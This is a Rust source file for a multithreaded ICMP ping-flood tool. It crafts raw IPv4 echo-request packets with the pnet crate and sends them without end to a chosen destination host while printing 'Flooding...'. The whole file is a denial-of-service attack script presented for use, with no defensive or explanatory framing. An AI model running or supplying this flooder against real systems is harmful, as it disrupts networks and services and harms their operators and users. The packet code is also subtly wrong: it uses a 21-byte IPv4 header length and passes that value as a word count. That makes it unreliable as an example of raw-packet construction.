use std::io::Write;
use std::net::Ipv4Addr;

use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use anyhow::Result;
use clap::Parser;
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::MutablePacket;

use pnet::packet::ipv4::MutableIpv4Packet;

use pnet::transport::transport_channel;
use pnet::transport::TransportChannelType::Layer3;
use pnet::util;

const IPV4_HEADER_LEN: usize = 21;
const ICMP_HEADER_LEN: usize = 8;
const SYMBOLS: [char; 4] = ['/', '-', '\\', '|'];

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Args {
  /// Destination address
  host: String,

  /// Packet size in bytes
  #[arg(short, long, default_value_t = 1471)]
  size: usize,

  /// Number of threads
  #[arg(short, long, default_value_t = 3)]
  threads: usize,
}

fn main() -> Result<()> {
  let args = Args::parse();
  let addr = args.host.parse()?;
  let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();
  let tx = Arc::new(Mutex::new(tx));

  println!("Payloading {}-byte packets", args.size);
  if args.threads > 1 {
    println!("Spawning {} threads", args.threads);
  }

  let handles: Vec<JoinHandle<()>> = (0..args.threads)
    .map(|_| {
      let tx = tx.clone();
      std::thread::spawn(move || {
        let mut buffer_icmp = vec![0u8; args.size + ICMP_HEADER_LEN];
        let mut buffer_ip = vec![0u8; buffer_icmp.len() + IPV4_HEADER_LEN];
        loop {
          let packet = create_icmp_packet(&mut buffer_ip, &mut buffer_icmp, addr, 64, 1);
          let mut tx = tx.lock().unwrap();
          if let Err(err) = tx.send_to(packet, std::net::IpAddr::V4(addr)) {
            panic!("{err}");
          }
        }
      })
    })
    .collect();

  let mut symbols = SYMBOLS.iter().cycle();
  while !handles.iter().all(|handle| handle.is_finished()) {
    print!("\rFlooding... {}", symbols.next().unwrap());
    std::io::stdout().flush().unwrap();
    std::thread::sleep(Duration::from_millis(100));
  }

  Ok(())
}

fn create_icmp_packet<'a>(
  buffer_ip: &'a mut [u8],
  buffer_icmp: &'a mut [u8],
  dest: Ipv4Addr,
  ttl: u8,
  sequence_number: u16,
) -> MutableIpv4Packet<'a> {
  let mut ipv4_packet = MutableIpv4Packet::new(buffer_ip).expect("Error creating ipv4 packet");
  ipv4_packet.set_version(4);
  ipv4_packet.set_header_length(IPV4_HEADER_LEN as u8);
  ipv4_packet.set_total_length((IPV4_HEADER_LEN + buffer_icmp.len()) as u16);
  ipv4_packet.set_ttl(ttl);
  ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
  ipv4_packet.set_destination(dest);

  let mut icmp_packet = MutableEchoRequestPacket::new(buffer_icmp).expect("Error creating icmp packet");
  icmp_packet.set_sequence_number(sequence_number);
  icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
  let checksum = util::checksum(icmp_packet.packet_mut(), 1);
  icmp_packet.set_checksum(checksum);
  
  ipv4_packet.set_payload(icmp_packet.packet_mut());
  ipv4_packet
}
